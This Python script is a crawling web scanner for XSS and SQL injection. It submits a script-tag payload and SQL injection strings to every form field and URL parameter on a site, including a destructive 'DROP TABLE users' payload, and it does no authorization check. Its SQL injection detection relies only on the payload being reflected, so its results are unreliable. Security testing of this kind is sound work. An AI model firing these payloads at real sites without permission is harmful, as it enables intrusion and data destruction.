import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re
import time

visited_links = set()
vulnerabilities = []

# Payloads
xss_payload = "<script>alert('XSS')</script>"
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    '" OR "1"="1',
    "'; DROP TABLE users; --"
]

headers = {
    "User-Agent": "Mozilla/5.0 (XSS_SQL_Scanner)"
}


def get_links(url):
    internal_links = set()
    try:
        response = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.content, "html.parser")
        for a_tag in soup.find_all("a", href=True):
            href = a_tag["href"]
            full_url = urljoin(url, href)
            if urlparse(full_url).netloc == urlparse(url).netloc:
                if full_url not in visited_links and "#" not in full_url:
                    internal_links.add(full_url)
    except requests.RequestException:
        pass
    return internal_links


def get_all_forms(url):
    try:
        soup = BeautifulSoup(requests.get(url, headers=headers).content, "html.parser")
        return soup.find_all("form")
    except:
        return []


def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        if name:
            inputs.append({"type": input_type, "name": name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        data[input["name"]] = payload
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, headers=headers)
        else:
            return requests.get(target_url, params=data, headers=headers)
    except requests.RequestException:
        return None


def test_xss_sql_injection(url):
    forms = get_all_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for payload in sql_payloads + [xss_payload]:
            response = submit_form(form_details, url, payload)
            if response and payload in response.text:
                vulnerabilities.append({
                    "url": url,
                    "type": "XSS" if "script" in payload else "SQL Injection",
                    "payload": payload,
                    "method": form_details["method"],
                    "form_action": form_details["action"]
                })
                print(f"[!!] Vulnerability found: {url} | Payload: {payload}")
                break


def test_url_params(url):
    parsed = urlparse(url)
    query = parsed.query
    if query:
        base = url.split('?')[0]
        params = query.split("&")
        for param in params:
            key = param.split("=")[0]
            for payload in sql_payloads + [xss_payload]:
                new_query = "&".join(
                    [f"{key}={payload}" if p.startswith(f"{key}=") else p for p in params])
                new_url = f"{base}?{new_query}"
                try:
                    res = requests.get(new_url, headers=headers)
                    if payload in res.text:
                        vulnerabilities.append({
                            "url": new_url,
                            "type": "XSS" if "script" in payload else "SQL Injection",
                            "payload": payload,
                            "method": "GET",
                            "form_action": "URL Query Param"
                        })
                        print(f"[!!] Vulnerability found: {new_url} | Payload: {payload}")
                        break
                except:
                    continue


def crawl_and_scan(start_url):
    to_crawl = [start_url]
    while to_crawl:
        url = to_crawl.pop()
        if url not in visited_links:
            print(f"[+] Crawling: {url}")
            visited_links.add(url)
            internal_links = get_links(url)
            to_crawl.extend(internal_links - visited_links)
            test_url_params(url)
            test_xss_sql_injection(url)
            time.sleep(0.5)  # Be polite


def write_report(filename="scan_report.txt"):
    with open(filename, "w") as f:
        if vulnerabilities:
            for v in vulnerabilities:
                f.write(f"[!] {v['type']} found at {v['url']}\n")
                f.write(f"    Payload: {v['payload']}\n")
                f.write(f"    Method: {v['method']}, Form Action: {v['form_action']}\n\n")
        else:
            f.write("No vulnerabilities found.\n")
    print(f"\n[+] Report saved to {filename}")


if __name__ == "__main__":
    target = input("Enter the URL to scan (e.g., http://testphp.vulnweb.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    crawl_and_scan(target)
    write_report()
